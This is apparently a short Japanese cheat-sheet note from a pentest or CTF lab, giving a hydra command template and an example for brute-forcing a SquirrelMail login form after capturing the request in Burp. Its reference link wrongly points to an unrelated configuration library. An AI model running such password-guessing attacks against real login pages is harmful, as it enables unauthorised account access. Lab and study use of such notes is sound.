# hydra

## Brute forcing/総当たり

### Webアプリ上のログインフォーム

※事前にBurpでリクエストとレスポンスをキャプチャして、hydraでBruteforceしたいパラメータのIDを把握しておき<loginname_id>や<password_id>に入れる。
```
hydra -l <loginname> -P <wordlist> <ip> http-post-form "/<url>:<loginname_id>=^USER^&<password_id>=^PASS^:<string_when_you_failed>"
```

例）ユーザは固定でパスワードはファイル記載のものを使う場合
```
hydra -l milesdyson -P log1.txt 10.10.35.30 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect"
```

## references

- https://github.com/facebookresearch/hydra



